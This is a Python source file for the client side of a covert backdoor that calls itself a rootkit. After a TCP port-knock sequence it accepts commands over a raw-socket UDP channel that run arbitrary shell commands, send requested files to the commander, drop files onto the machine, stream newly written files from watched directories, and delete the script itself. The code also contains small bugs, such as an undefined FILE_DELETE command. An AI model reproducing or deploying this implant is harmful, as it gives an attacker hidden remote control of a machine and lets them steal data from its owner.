#!/usr/bin/env python3
"""
Client Program - Integrated Port Knock + Raw Socket Covert Channel
Listens for TCP port knocks, then accepts commands via UDP raw socket covert channel.

REQUIRES: Root/Administrator privileges for raw sockets
Usage: sudo python3 client.py
"""
import os
import socket
import struct
import time
import sys
import subprocess
from enum import IntEnum
from collections import deque
import threading
from raw_socket_protocol import RawSocketProtocol
from file_watcher import FileWatcher

# Configuration
KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
KNOCK_TIMEOUT = 10  # Seconds to complete knock sequence
COMMAND_PORT = 8888  # UDP port for covert channel
TMP_DIR = "client_files/"  # Directory for files transferred from commander


class CommandType(IntEnum):
    """Commands encoded in UDP src-port field"""
    DISCONNECT = 0x1234
    UNINSTALL = 0x2345
    TRANSFER_TO_CLIENT = 0x3456
    TRANSFER_FROM_CLIENT = 0x4567
    RUN_COMMAND = 0x5678
    FILE_WATCH = 0x6789
    STOP_WATCH = 0x8901
    ACK = 0x9ABC
    ERROR = 0xABCD


class Client:
    """
    Client that:
    1. Listens for TCP port knocks
    2. After successful knock, accepts commands via UDP raw socket covert channel
    """

    def __init__(self):
        self.knock_ports = KNOCK_SEQUENCE
        self.command_port = COMMAND_PORT
        self.knock_sequence = KNOCK_SEQUENCE
        self.knock_timeout = KNOCK_TIMEOUT
        self.knock_attempts = {}
        self.authorized_ips = set()
        self.lock = threading.Lock()
        self.running = True
        self.protocol = RawSocketProtocol()
        self._watcher_thread = None  # active watcher thread
        self._watcher_stop = threading.Event()  # set to stop the watcher

    # ------------------------------------------------------------------ #
    #  Port-knock helpers                                                  #
    # ------------------------------------------------------------------ #

    def record_knock(self, ip_address, port):
        """Record a knock attempt and check whether the full sequence is complete."""
        current_time = time.time()

        with self.lock:
            if ip_address not in self.knock_attempts:
                self.knock_attempts[ip_address] = {
                    'knocks': deque(),
                    'last_knock': current_time
                }

            knock_data = self.knock_attempts[ip_address]

            # Reset if the sequence timed out
            if current_time - knock_data['last_knock'] > self.knock_timeout:
                knock_data['knocks'].clear()

            knock_data['knocks'].append(port)
            knock_data['last_knock'] = current_time

            # Keep only the last N knocks
            while len(knock_data['knocks']) > len(self.knock_sequence):
                knock_data['knocks'].popleft()

            if list(knock_data['knocks']) == self.knock_sequence:
                print(f"\n{'=' * 60}")
                print(f"[+] VALID KNOCK SEQUENCE from {ip_address}")
                print(f"[+] Authorizing for covert channel communication")
                print(f"{'=' * 60}\n")
                knock_data['knocks'].clear()
                self.authorized_ips.add(ip_address)
                return True

        return False

    def is_authorized(self, ip_address):
        with self.lock:
            return ip_address in self.authorized_ips

    def revoke_authorization(self, ip_address):
        with self.lock:
            if ip_address in self.authorized_ips:
                self.authorized_ips.remove(ip_address)
                print(f"[*] Revoked authorization for {ip_address}")

    def listen_for_knocks(self, port):
        """Thread target: listen for TCP knocks on a single port."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)

        try:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            print(f"[*] Knock listener on TCP port {port}")

            while self.running:
                try:
                    conn, addr = sock.accept()
                    ip_address = addr[0]
                    print(f"[+] Knock on port {port} from {ip_address}")
                    self.record_knock(ip_address, port)
                    conn.close()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Error on knock port {port}: {e}")
        except Exception as e:
            print(f"[!] Failed to bind to port {port}: {e}")
        finally:
            sock.close()

    # ------------------------------------------------------------------ #
    #  Covert channel listener                                            #
    # ------------------------------------------------------------------ #

    def _reset_transfer_state(self):
        """Return a clean slate for a new inbound transfer."""
        return {
            'chunks': {},
            'expected_total': None,
            'current_command': None,
            'current_src_ip': None,
        }

    def listen_for_covert_commands(self):
        """Listen for covert channel commands via raw UDP socket."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            print(f"[*] Covert channel listener on UDP port {self.command_port}")
            print("[*] Waiting for covert packets...")
            print()

            state = self._reset_transfer_state()

            while self.running:
                try:
                    packet, addr = sock.recvfrom(65535)
                    parsed = self.protocol.parse_udp_packet(packet)
                    if not parsed:
                        continue

                    if parsed["dst_port"] != self.command_port:
                        continue

                    src_ip = addr[0]

                    if not self.is_authorized(src_ip):
                        print(f"[!] Unauthorized covert packet from {src_ip} — ignoring")
                        continue

                    seq = parsed["seq"]
                    data = parsed["data"]
                    total = parsed["total"]
                    command_code = parsed["command"]

                    # ── Reset if a new sender interrupts an in-progress transfer ──
                    if state['current_src_ip'] is not None and src_ip != state['current_src_ip']:
                        print(f"[!] Source IP changed mid-transfer "
                              f"({state['current_src_ip']} → {src_ip}) — resetting state")
                        state = self._reset_transfer_state()

                    # ── Initialise state on first packet of a new command ─────────
                    if state['expected_total'] is None:
                        state['expected_total'] = total
                        state['current_command'] = command_code
                        state['current_src_ip'] = src_ip
                        state['chunks'] = {}
                        print(f"\n[+] Receiving covert command from {src_ip}")
                        print(f"    Expected packets: {total}")

                    print(f"[DEBUG] seq={seq}/{state['expected_total']} "
                          f"cmd=0x{command_code:04X}")

                    state['chunks'][seq] = data

                    # Progress for large transfers
                    received = len(state['chunks'])
                    if received % 50 == 0 and received > 0:
                        print(f"    Received {received}/{state['expected_total']}")

                    # ── All chunks received? ──────────────────────────────────────
                    if state['expected_total'] and received >= state['expected_total']:

                        # Check for sequence gaps before reassembling
                        expected_seqs = set(range(1, state['expected_total'] + 1))
                        received_seqs = set(state['chunks'].keys())
                        if expected_seqs != received_seqs:
                            missing = expected_seqs - received_seqs
                            print(f"[!] Missing sequences {missing} — dropping command")
                            state = self._reset_transfer_state()
                            continue

                        # Reassemble payload
                        raw = b''.join(
                            state['chunks'][i] for i in sorted(state['chunks'])
                        )
                        # Trim the single padding byte added for odd-length data
                        if (state['expected_total'] * 2) > len(raw):
                            payload = raw[:-1]
                        else:
                            payload = raw

                        try:
                            command_type = CommandType(state['current_command'])
                        except ValueError:
                            print(f"[!] Unknown command code: 0x{state['current_command']:04X}")
                            state = self._reset_transfer_state()
                            continue

                        print(f"\n[+] Covert command received from {state['current_src_ip']}")
                        print(f"    Command:      {command_type.name}")
                        print(f"    Payload size: {len(payload)} bytes")

                        src = state['current_src_ip']

                        # Reset BEFORE processing so re-entrant packets aren't confused
                        state = self._reset_transfer_state()

                        self.process_command(command_type, payload, src)

                        if command_type == CommandType.DISCONNECT:
                            self.revoke_authorization(src)

                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] Error receiving covert packet: {e}")
                    continue

            sock.close()

        except PermissionError:
            print("[!] Raw sockets require root privileges")
            print("[!] Run with: sudo python3 client.py")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Fatal error: {e}")
            sys.exit(1)

    # ------------------------------------------------------------------ #
    #  Command handlers                                                    #
    # ------------------------------------------------------------------ #

    def process_command(self, command_type, payload, src_ip):
        """Dispatch and handle a fully-reassembled command."""

        if command_type == CommandType.DISCONNECT:
            print("[*] Processing DISCONNECT")
            print(f"    Closing session with {src_ip}")
            # Authorization is revoked by the caller after this returns

        elif command_type == CommandType.UNINSTALL:
            print("[*] Processing UNINSTALL")
            print("    Sending ACK then uninstalling...")
            # Send ACK BEFORE deleting the script so the response goes out
            self.send_response(src_ip, CommandType.ACK,
                               b"Rootkit uninstalled from client")
            time.sleep(0.5)  # allow send_response to complete
            try:
                os.remove(sys.argv[0])
                print("    Script removed.")
            except Exception as e:
                print(f"    Could not remove script: {e}")
            self.running = False  # shut down the client

        elif command_type == CommandType.TRANSFER_TO_CLIENT:
            print("[*] Processing TRANSFER_TO_CLIENT")
            try:
                filename_length = struct.unpack('!H', payload[:2])[0]
                filename = payload[2:2 + filename_length].decode('utf-8')
                filedata = payload[2 + filename_length:]

                print(f"    Receiving file: {filename} ({len(filedata)} bytes)")

                filepath = os.path.join(os.getcwd(), TMP_DIR, filename)
                with open(filepath, 'wb') as f:
                    f.write(filedata)
                print(f"    File saved to: {filepath}")

            except Exception as e:
                print(f"    Error saving file: {e}")

        elif command_type == CommandType.TRANSFER_FROM_CLIENT:
            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
            print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                print(f"    Sending {len(content)} bytes to commander")
                self.send_response(src_ip, CommandType.ACK, content)
            except Exception as e:
                print(f"    Error: {e}")
                self.send_response(src_ip, CommandType.ERROR, str(e).encode())

        elif command_type == CommandType.RUN_COMMAND:
            cmd = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
            print(f"[*] Processing RUN_COMMAND: {cmd}")
            try:
                result = subprocess.run(
                    cmd, shell=True,
                    capture_output=True, text=True,
                    timeout=30
                )
                output = result.stdout or ""
                stderr = result.stderr or ""
                if stderr:
                    print(f"    stderr: {stderr.strip()}")
                print(f"    Output ({len(output)} bytes): {output.strip()}")
                self.send_response(src_ip, CommandType.ACK, output.encode('utf-8'))
            except Exception as e:
                print(f"    Error: {e}")
                self.send_response(src_ip, CommandType.ERROR, str(e).encode())

        elif command_type == CommandType.FILE_WATCH:
            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
            print(f"[*] Processing FILE_WATCH: {filepath}")

            try:
                self._stop_file_watcher()
                watcher = FileWatcher(path=filepath, recursive=True)

                def run_watcher():
                    import inotify.adapters
                    try:
                        i = inotify.adapters.InotifyTree(watcher.path, mask=watcher.event_mask)
                        for event in i.event_gen(yield_nones=True):
                            if self._watcher_stop.is_set():
                                print("[*] File watcher stopped.")
                                break
                            if event is None:
                                continue
                            _, type_names, watch_path, filename = event
                            # Handle the event ourselves instead of calling watcher._handle()
                            if not filename:
                                continue
                            _, ext = os.path.splitext(filename)
                            if ext in watcher.ignore_exts or filename.startswith('.'):
                                continue
                            full_path = os.path.join(watch_path, filename)
                            for event_name in type_names:
                                if event_name in ('IN_CLOSE_WRITE', 'IN_MOVED_TO'):
                                    try:
                                        with open(full_path, 'rb') as f:
                                            filedata = f.read()

                                        filename_bytes = filename.encode('utf-8')
                                        pkt_payload = struct.pack('!H', len(filename_bytes)) + filename_bytes + filedata
                                        self.send_response(src_ip, CommandType.FILE_WATCH, pkt_payload)

                                        print(f"[*] Watcher: sent '{filename}' ({len(filedata)} bytes)")

                                    except Exception as e:
                                        print(f"[!] Watcher: could not send '{filename}': {e}")

                                elif event_name in 'IN_DELETE':
                                    print(f"filename = {filename}")
                                    self.send_response(src_ip, CommandType.FILE_DELETE, filename.encode('utf-8'))
                                    print(f"[*] Watcher: notified deletion of '{filename}'")

                    except Exception as e:
                        print(f"[!] Watcher thread error: {e}")

                self._watcher_stop.clear()
                self._watcher_thread = threading.Thread(target=run_watcher, daemon=True)
                self._watcher_thread.start()
                print(f"    Watcher started on {filepath}")

            except Exception as e:
                print(f"    Error: {e}")
                self.send_response(src_ip, CommandType.ERROR, str(e).encode())

        elif command_type == CommandType.STOP_WATCH:
            print("[*] Processing STOP_WATCH")
            self._stop_file_watcher()
            print("    File watcher stopped.")

    def _stop_file_watcher(self):
        """Stop the active watcher thread if one is running."""
        if self._watcher_thread and self._watcher_thread.is_alive():
            self._watcher_stop.set()
            self._watcher_thread.join(timeout=3)
        self._watcher_thread = None
        self._watcher_stop.clear()

    def send_response(self, dst_ip, command_type, payload):
        """Send a response back to the commander via the covert channel."""
        try:
            self.protocol.send_packet(
                self.get_local_ip(),
                dst_ip,
                self.command_port,
                command_type,
                payload
            )
            print(f"    Response sent to {dst_ip}")
        except Exception as e:
            print(f"    Failed to send response: {e}")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    # ------------------------------------------------------------------ #
    #  Entry point                                                         #
    # ------------------------------------------------------------------ #

    def start(self):
        print("=" * 60)
        print("Client - Port Knock + Raw Socket Covert Channel")
        print("=" * 60)
        print(f"Knock sequence: {self.knock_sequence}")
        print(f"Knock timeout:  {self.knock_timeout}s")
        print(f"Command port:   UDP {self.command_port}")
        print("=" * 60)
        print()

        os.makedirs(os.path.join(os.getcwd(), TMP_DIR), exist_ok=True)

        # Start a knock-listener thread for each port
        for port in self.knock_ports:
            t = threading.Thread(target=self.listen_for_knocks, args=(port,), daemon=True)
            t.start()

        # Covert channel listener runs on the main thread
        try:
            self.listen_for_covert_commands()
        except KeyboardInterrupt:
            print("\n[*] Shutting down client...")
            self.running = False


def main():
    print("Client Program")
    print("Requires root/admin privileges for raw sockets")
    print()
    client = Client()
    client.start()


if __name__ == "__main__":
    main()
